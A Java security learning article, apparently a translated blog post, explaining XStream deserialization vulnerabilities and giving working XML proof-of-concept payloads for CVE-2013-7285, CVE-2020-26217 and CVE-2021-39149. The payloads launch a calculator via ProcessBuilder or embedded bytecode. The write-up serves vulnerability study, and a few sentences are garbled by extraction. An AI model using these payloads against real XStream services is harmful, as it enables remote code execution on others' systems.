# Java Security Learningâ€”XStream Deserialization Vulnerability

Author: H3rmesk1t

Data: 2022.03.02

# XStream
## Introduction
[XStream](https://zh.wikipedia.org/wiki/XStream) is a Java class library used to serialize objects into XML format, or deserialize `XML` into objects.

## Serialization and deserialization
First define an interface class `DemoInterface`:

```java
package org.h3rmesk1t.XStream;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/2 11:25 am
 */
public interface DemoInterface {

    void output();
}

```

Then define the `Demo` class to implement the previous interface:

```java
package org.h3rmesk1t.XStream;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/2 11:25 am
 */
public class Demo implements DemoInterface {

    String name;

    public void output() {

        System.out.println("Hello, " + this.name);
    }
}
```

Call `XStream.toXML` to implement serialization, and call `XStream.fromXML` to implement deserialization:

```java
package org.h3rmesk1t.XStream;

import com.thoughtworks.xstream.XStream;
import com.thoughtworks.xstream.io.xml.DomDriver;

import java.io.FileInputStream;
import java.io.FileNotFoundException;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/2 11:27 am
 */
public class DemoXML {

    public static void main(String[] args) throws FileNotFoundException {

// Demo demo = new Demo();
// demo.name = "h3rmesk1t";
// XStream xStream = new XStream(new DomDriver());
// String xml = xStream.toXML(demo);
// System.out.println(xml);
        FileInputStream xml = new FileInputStream("/Users/h3rmesk1t/Desktop/JavaSec-Learn/src/main/java/org/h3rmesk1t/XStream/demo.xml");
        XStream xStream = new XStream(new DomDriver());
        Demo demo = (Demo) xStream.fromXML(xml);
        demo.output();
    }
}
```

Serialization and deserialization operations are output separately:
 - Serialization

```xml
<org.h3rmesk1t.XStream.Demo>
    <name>h3rmesk1t</name>
</org.h3rmesk1t.XStream.Demo>
```

```text
Hello, h3rmesk1t
```

# XStream Deserialization Vulnerability
As of now, [Vulnerability Collection] given on the official website of `XStream` (https://x-stream.github.io/security.html#:~:text=%E6%A3%80%E6%9F%A5%E6%9D%A5%E5%A4%84%E7%90%86%E3%80%82-,%E8%AE%B0%E5%BD%95%E7%9A%84%E6%BC%8F%E6%B4%9E,-%E5%A4%9A%E5%B9%B4%E6%9D%A5%EF%BC%8CMitre)

<div align=center><img src="./images/7.png"></div>

## Pre-knowledge
### Converter
[Converter](http://x-stream.github.io/converters.html) is to provide a strategy for converting between a specific type of object found in an object graph and `XML`. `XStream` provides a Converter converter for common types of Java (for example: primitive types, strings, files, collections, arrays, and dates). In short, it can identify the tag fields in it and convert them into the corresponding object after entering `XML`, and vice versa.

There are three methods that a converter needs to implement:
 - `canConvert` method: Tells the `XStream` object, the object it can convert.
 - `marshal` method: The specific operation when converting an object to `XML`.
 - `unmarshal` method: The specific operation when converting `XML` to an object.

#### MapConverter
`MapConverter` is a `Converter` restored for the `Map` type. Follow up `MapConverter#unmarshal`, call `unmarshal`, `populateMap`, `putCurrentEntryIntoMap` in turn, and finally enter `target.put(key, value);`, call `put` function of `Map`, and then call `hashCode` function for `key`.

<div align=center><img src="./images/1.png"></div>

#### TreeSet/TreeMapConverter
There is not much difference between `TreeSetConverter` and `TreeMapConverter`. `TreeSet` itself is a `TreeMap` that only uses `Key`. The deserialization process of `TreeSetConverter` is also converted into `TreeMapConverter` to prioritize restoration of `TreeSet`, and then populated into `TreeSet`.

Here we will take a look at the entire calling process from the `TreeSetConverter` call. First extract the `TreeMap` from `TreeSet`, and then further call `TreeMapConverter` to restore `TreeMap`. Use `sortedMap` in `TreeMapConverter` to populate the `Entry` that needs to be restored. Here we will return to the `populateMap` and `putCurrentEntryIntoMap` methods mentioned above, and finally call the `TreeMap.putAll` method and call the `java.util.AbstractMap#putAll` method.

<div align=center><img src="./images/2.png"></div>

<div align=center><img src="./images/3.png"></div>

#### DynamicProxyConverter
`DynamicProxyConverter` is a dynamic proxy converter, which is a converter supported by `XStream`. Its existence allows `XStream` to deserialize `XML` content into dynamic proxy class objects. Here you can refer to the `POC` given by [XStream official website]():

```xml
<contact class='dynamic-proxy'>
  <interface>org.company.model.Contact</interface>
  <handler class='java.beans.EventHandler'>
    <target class='java.lang.ProcessBuilder'>
      <command>
        <string>calc.exe</string>
      </command>
    </target>
    <action>start</action>
  </handler>
</contact>
```

After deserializing the `dynamic-proxy` tag, a dynamic proxy class object will be obtained. When the method declared in the `org.company.model.Contact` interface class of the object is accessed, the class method `java.beans.EventHandler` in the `handler` tag is called.

### EventHandler
The `EventHandler` class is mentioned in the `POC` written based on the `DynamicProxyConverter` converter given above, which provides support for dynamically generated event listeners, whose methods execute a simple statement involving incoming event objects and target objects.

The `EventHandler` class is an implementation of the InvocationHan
The code defined by the dler class, the `EventHandler` class is as follows: It contains the `target` and `action` attributes. In the function call chain of `EventHandler.invoke`->`EventHandler.invokeInternal`->`MethodUtil.invoke`, the previous two attributes will be used as class methods and parameters to continue to reflect the call.

<div align=center><img src="./images/4.png"></div>

## Basic Principles
`XStream` is a set of serialization and deserialization mechanisms implemented by itself. The core is to convert `XML` and objects with each other through the `Converter` converter, which is different from the native `Java` serialization and deserialization mechanism.

The existence of the `XStream` deserialization vulnerability is because `XStream` supports a converter named `DynamicProxyConverter`, which can convert the content of the `dynamic-proxy` tag in XML into a dynamic proxy class object. When the program calls the method declared by the interface tag pointed to by the `dynamic-proxy` tag, it will proxy the class method specified by the `dynamic-proxy` tag through the dynamic proxy mechanism. Using this mechanism, an attacker can construct malicious `XML` content, That is, the `handler` tag in the `dynamic-proxy` tag points to a malicious class such as the `EventHandler` class that can implement any function reflection call, and the `interface` tag points to the interface method that the target program will inevitably call. Finally, when the attacker enters the malicious `XML` content from the outside, it can trigger the deserialization vulnerability, thereby achieving the purpose of arbitrary code execution.

## Vulnerability Analysis
`XStream` is a great person. [XStream official website](https://x-stream.github.io/security.html) gives `POC` corresponding to the vulnerability that can be created using the Java runtime with `XStream`.

### CVE-2013-7285
#### Vulnerability Information
 1. Vulnerability
    - CVE-2013-7285: XStream can be used for Remote Code Execution.
 2. Affected Versions
    - All versions until and including version 1.4.6 are affected. Version 1.4.10 is affected if the security framework has not been initialized.
 3. Description
    - The processed stream at unmarshalling time contains type information to recreate the formerly written objects. XStream creates therefore new instances based on these type information. An attacker can manipulate the processed input stream and replace or inject objects, that can execute arbitrary shell commands.

#### POC
Based on `sorted-set`:

```xml
<sorted-set>
<string>foo</string>
<dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="java.beans.EventHandler">
        <target class="java.lang.ProcessBuilder">
            <command>
                <string>open</string>
                <string>-a</string>
                <string>Calculator</string>
            </command>
        </target>
        <action>start</action>
    </handler>
</dynamic-proxy>
</sorted-set>
```

Based on `tree-map`:

```xml
<tree-map>
<entry>
    <string>fookey</string>
    <string>foovalue</string>
</entry>
<entry>
    <dynamic-proxy>
        <interface>java.lang.Comparable</interface>
        <handler class="java.beans.EventHandler">
            <target class="java.lang.ProcessBuilder">
                <command>
                    <string>open</string>
                    <string>-a</string>
                    <string>Calculator</string>
                </command>
            </target>
            <action>start</action>
        </handler>
    </dynamic-proxy>
    <string>good</string>
</entry>
</tree-map>
```

Based on interfaces, please note here:
 - You must know what interface class is obtained by server deserialization, and you need to fill in `interface`.
 - The interface class must be defined as `public`, otherwise the program will report an error when it runs, which shows that there is no permission to access the interface class.

```xml
<contact class='dynamic-proxy'>
<interface>org.h3rmesk1t.XStream.DemoInterface</interface>
<handler class='java.beans.EventHandler'>
    <target class='java.lang.ProcessBuilder'>
        <command>
            <string>open</string>
            <string>-a</string>
            <string>Calculator</string>
        </command>
    </target>
    <action>start</action>
</handler>
</contact>
```

<div align=center><img src="./images/5.png"></div>

#### Process Analysis
Reference [Java XStream Deserialization Vulnerability](https://www.mi1k7ea.com/2019/10/21/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#:~:text=%E4%B8%8B%E9%9D%A2%E6%88%91%E4%BB%AC%E5%9C%A8xstream.fromXML()%E8%AF%AD%E5%8F%A5%E4%B8%AD%E6%89%93%E4%B8%8A%E6%96%AD%E Debugging process in 7%82%B9%E8%BF%9B%E8%A1%8C%E8%B0%83%E8%AF%95%EF%BC%8C%E5%90%8C%E6%97%B6%E5%9C%A8EventHandler%E7%B1%BB%E4%B8%AD%E7%9A%84invoke()%E5%92%8CinvokeInternal()%E5%87%BD%E6%95%B0%E4%B8%8A%E4%B9%9F%E6%89%93%E4%B8%8A%E6%96%AD%E7%82%B9%E3%80%82).

### CVE-2020-26217
#### Vulnerability Information
 1. Vulnerability
    - CVE-2020-26217: XStream can be used for Remote Code Execution.
 2. Affected Versions
    - All versions until and including version 1.4.13 are affected, if using the version out of the box. No user is affected, who followed the recommendation to setup [XStream's security framework](https://x-stream.github.io/security.html#f
ramework) with a whitelist.
 3. Description
    - The processed stream at unmarshalling time contains type information to recreate the formerly written objects. XStream creates therefore new instances based on these type information. An attacker can manipulate the processed input stream and replace or inject objects, that can execute arbitrary shell commands.
    - This issue is a variation of CVE-2013-7285, this time using a different set of classes of the Java runtime environment, none of which is part of the XStream default blacklist. The same issue has already been reported for Strut's XStream plugin in CVE-2017-9805, but the XStream project has never been informed about it.

#### POC
```xml
<map>
    <entry>
        <jdk.nashorn.internal.objects.NativeString>
            <flags>0</flags>
            <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>
                <dataHandler>
                    <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>
                        <contentType>text/plain</contentType>
                        <is class='java.io.SequenceInputStream'>
                            <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>
                                <iterator class='javax.imageio.spi.FilterIterator'>
                                    <iter class='java.util.ArrayList$Ittr'>
                                        <cursor>0</cursor>
                                        <lastRet>-1</lastRet>
                                        <expectedModCount>1</expectedModCount>
                                        <outer-class>
                                            <java.lang.ProcessBuilder>
                                                <command>
                                                    <string>open</string>
                                                    <string>-a</string>
                                                    <string>Calculator</string>
                                                </command>
                                            </java.lang.ProcessBuilder>
                                        </outer-class>
                                    </iter>
                                    <filter class='javax.imageio.ImageIO$ContainsFilter'>
                                        <method>
                                            <class>java.lang.ProcessBuilder</class>
                                            <name>start</name>
                                            <parameter-types/>
                                        </method>
                                        <name>start</name>
                                    </filter>
                                    <next/>
                                </iterator>
                                <type>KEYS</type>
                            </e>
                            <in class='java.io.ByteArrayInputStream'>
                                <buf></buf>
                                <pos>0</pos>
                                <mark>0</mark>
                                <count>0</count>
                            </in>
                        </is>
                        <consumed>false</consumed>
                    </dataSource>
                    <transferFlavors/>
                </dataHandler>
                <dataLen>0</dataLen>
            </value>
        </jdk.nashorn.internal.objects.NativeString>
        <string>test</string>
    </entry>
</map>
```

<div align=center><img src="./images/6.png"></div>

#### Process Analysis
Refer to the debugging process in [XStream Deserialization CVE-2020-26217 Vulnerability Analysis] (https://www.anquanke.com/post/id/222830#:~:text=%C2%A0-,%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90, -%E7%94%B1%E4%BA%8E%E8%AF%A5%E6%BC%8F%E6%B4%9E).

### CVE-2021-39149
#### Vulnerability Information
 1. Vulnerability
    - CVE-2021-39149: XStream is vulnerable to an Arbitrary Code Execution attack.
 2. Affected Versions
    - All versions until and including vers
ion 1.4.17 are affected, if using the version out of the box. No user is affected, who followed the recommendation to setup [XStream's security framework](https://x-stream.github.io/security.html#framework) with a whitelist limited to the minimum required types.
 3. Description
    - The processed stream at unmarshalling time contains type information to recreate the formerly written objects. XStream creates therefore new instances based on these type information. An attacker can manipulate the processed input stream and replace or inject objects, that result in execution of arbitrary code loaded from a remote server.

#### POC

```xml
<linked-hash-set>
    <dynamic-proxy>
        <interface>map</interface>
        <handler class='com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl'>
            <classToInvocationHandler class='linked-hash-map'/>
            <defaultHandler class='sun.tracing.NullProvider'>
                <active>true</active>
                <providerType>java.lang.Object</providerType>
                <probes>
                    <entry>
                        <method>
                            <class>java.lang.Object</class>
                            <name>hashCode</name>
                            <parameter-types/>
                        </method>
                        <sun.tracing.dtrace.DTraceProbe>
                            <proxy class='com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl' serialization='custom'>
                                <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
                                    <default>
                                        <__name>Pwnr</__name>
                                        <__bytecodes>
                                            <byte-array>yv66vgAAADIAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZ QEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzb3NlcmmlhbC9wYXlsb2F kcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc 3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW5 0ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZ XB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l 0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hc GFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmmlhbGl6ZXIvU2VyaWFsaXp hdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2Fk AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcm cvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQARamF2YS9sYW5n L1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEACGNhbGMuZXhlCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTG phdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA1TdGFja01hcFRhYmxlAQAbeXNvc2VyaWFsL1B3bmVyNjMzNTA1NjA2NTkzAQAdTHlzb3NlcmmlhbC9Qd25lcjYzMzUwNTYwNjU5 MzsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAgAIAQAKAAsAAQAMAAAALwABAAEAAAFKrcAAbEAAAAAACAA0AAAAAGAAEAAAVAAA4AAAAMAAEAAAFAA8AOAAAAAAEAEwAUAAAIADA AAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAA0AA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAAC AA0AAAAAGAAEAAAA4AA4AAAQAAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAAAAAABAB4AHwADABkAAAAAAEAAEAGgAIACkACwABAAWAAAAAAKAAMAAgAAAAAAAAAA+nAAMBTLgALxIxtg
A1V7EAAAABADYAAADAAEDAAIAIAIAAAAAIAIAIQARAAACgABAAIAIAIwAQAAk=</byte-array>
                                            <byte-array>yv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQ EAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgAL BwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAg ADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAAgANAAAAABgABAAAAAPAAAAAAAAAAAABQAPABIAAAAAAAABQAPABIAAAAAAAAAABMAAAACABQAEQAAAAAOAAAQACABYAEAAJ</byte-array>
                                        </__bytecodes>
                                        <__transletIndex>-1</__transletIndex>
                                        <__indentNumber>0</__indentNumber>
                                    </default>
                                    <boolean>false</boolean>
                                </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
                            </proxy>
                            <implementing__method>
                                <class>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</class>
                                <name>getOutputProperties</name>
                                <parameter-types/>
                            </implementing__method>
                        </sun.tracing.dtrace.DTraceProbe>
                    </entry>
                </probes>
            </defaultHandler>
        </handler>
    </dynamic-proxy>
</linked-hash-set>
```

#### Process Analysis
Refer to the debugging process in [Xstream Deserialization Analysis (CVE-2021-39149)](https://xz.aliyun.com/t/10360#:~:text=%E6%B4%9E%E7%9C%9F%E6%96%B9%E4%BE%BF%E3%80%82-,%E6%AD%A3%E5%84%BF%E5%85%AB%E7%9A%84%E5%88%86%E6%9E%90).

# refer to
 - [Java XStream Deserialization Vulnerability](https://www.mi1k7ea.com/2019/10/21/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#%E5%A4%8D%E7%8E%B0-2)
 - [XStream Deserialization CVE-2020-26217 Vulnerability Analysis](https://www.anquanke.com/post/id/222830#h2-2)
 - [Xstream Deserialization Analysis (CVE-2021-39149)](https://xz.aliyun.com/t/10360)
 - [Review of XStream Deserialization Vulnerability](https://www.anquanke.com/post/id/204314#h3-7)